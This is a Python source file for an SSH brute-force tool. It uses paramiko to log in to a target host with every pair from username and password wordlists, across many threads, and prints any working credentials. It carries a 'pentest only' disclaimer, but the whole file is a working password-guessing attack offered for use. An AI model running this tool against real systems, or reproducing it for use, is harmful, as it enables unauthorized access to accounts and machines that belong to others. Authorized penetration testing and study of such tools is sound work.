#coding:utf8

docs = """
        [*] This was written for educational purpose and pentest only. Use it at your own risk.
        [*] Author will be not responsible for any damage!
        [*] Toolname			:	brute_ssh.py
        [*] Coder			:	sera
        [*] Version			:	0.1
        [*] ample of use	: python brute_ssh.py -t 192.168.1.100 -u root -pl password.txt
        """

from queue import Queue
import paramiko
from paramiko.ssh_exception import SSHException
import threading
import sys
import time

def logo():
    print("                |---------------------------------------------------------------|")
    print("                |                                                               |")
    print("                |                           77sera.cn                           |")
    print("                |                2018-8-19 brute_ssh.py v.0.1                   |")
    print("                |                        SSH Brute Forcing Tool                 |")
    print("                |                                                               |")
    print("                |---------------------------------------------------------------|\n")
    print(docs)

ssh = paramiko.SSHClient()

#允许连接不在~/.ssh/known_hosts文件中的主机
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

limit_count = 1000 #设置最大尝试次数
limit_thread = 20 #设置最大线程数

#载入字典文件，返回一个一维list
def load_file(file_path):
	ok = 0
	try:
		data = open(file_path,'r').readlines()
		ok = 1
	except:
		data = []
	if not ok: #载入字典失败
		print('[!] Load file failed!')
		sys.exit(1)
	return data
				
def xhelp():
    print("[*]-t, --target            ip/hostname     <> Our target")
    print("[*]-u, --username      username    <> username string, default root")
    print("[*]-p, --password      password    <> passwordlist string")
    print("[*]-ul, --username_list      username list    <> username list")
    print("[*]-pl, --password_list      password list    <> passwordlist list")
    print("[*]-po, --port     port   <> target port ,default 22")
    print("[*]-h, --help              help            <> print this help")
    print("[*]-l, --limit_count              max of brute            <> max of brute")
    print("[*]Example : python brute_ssh.py -t 192.168.1.100 -u root -p password")
    sys.exit(1)
			
def main():
	logo()
	hostname = ''
	port = 22
	username = 'root'
	password = ''
	username_list = ''
	password_list = ''
	try:
		for argv in sys.argv:
			if argv.lower() == "-t" or argv.lower() == "--target":
				hostname = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-po" or argv.lower() == "--port":
				port = int(sys.argv[sys.argv.index(argv)+1])
			elif argv.lower() == "-u" or argv.lower() == "--username":
				username = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-p" or argv.lower() == "--password":
				password = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-ul" or argv.lower() == "--username_list":
				username_list = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-pl" or argv.lower() == "--password_list":
				password_list = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-l" or argv.lower() == "--limit_count":
				limit_count = sys.argv[sys.argv.index(argv)+1]
			elif argv.lower() == "-h" or argv.lower() == "--help":
				xhelp()
	except SystemExit:
		print("[!] Cheak your parametars input")
		sys.exit(0)
	except Exception:
		xhelp()

	#初始化list
	usernames = [] 
	passwords = []
	global q
	q = Queue() #用户字典和密码字典的笛卡尔积，是个队列
	
	 #根据参数判断是否需要载入字典，不需要则list只有一个值
	if username_list != '': 
		usernames = load_file(username_list)
	else:
		usernames.append(username)
	if password_list != '':
		passwords = load_file(password_list)
	else:
		passwords.append(password)
	
	#生成用户字典和密码字典的笛卡尔积
	for u in usernames:
		u = u.strip()
		for p in passwords:
			p = p.strip()
			q.put([u,p])
	
	global count
	global flag
	global success_u
	global success_p
	success_u = ''
	success_p = ''
	count = 0 #计数
	flag = 0
	thread_list = [] #初始化线程list
	
	print('[*] Cracking start...')
	
	while True:
		time.sleep(0.3)
		if q.empty():
			break
		elif flag == 1:
			break
		elif len(thread_list) < limit_thread:
			if not q.empty():
				t = threading.Thread(target=brute_ssh,args=(hostname,port,))
				t.start()
				thread_list.append(t)
		elif len(thread_list) >= limit_thread:
			for t in thread_list:
				t.join()
				thread_list.remove(t)
		elif count == limit_count:
			print('[*] Cracking failed')
			print('[*] Exit')
			sys.exit(1)

			#brute_ssh(host=hostname,port=port)
	for t in thread_list:
		t.join()
		thread_list.remove(t)
			
	if not flag:
		print('[!] No usernames or passwords left!')
		print('[!] END')
	else:
		print('[!] Cracking success!')
		print('[*] username=>'+success_u)
		print('[*] password=>'+success_p)

def brute_ssh(host,port):
	global count
	global flag
	global q
	global success_u
	global success_p
	if not q.empty():
		count+=1
		u,p = q.get()
		print('[-] trying '+str(count)+' data...u='+u+'\tp='+p)
	try:
		ssh.connect(hostname=host, port=port, username=u, password=p)
		success_u = u
		success_p = p
		flag = 1
		ssh.close()
	except:
		pass
			
if __name__ == '__main__':
	main()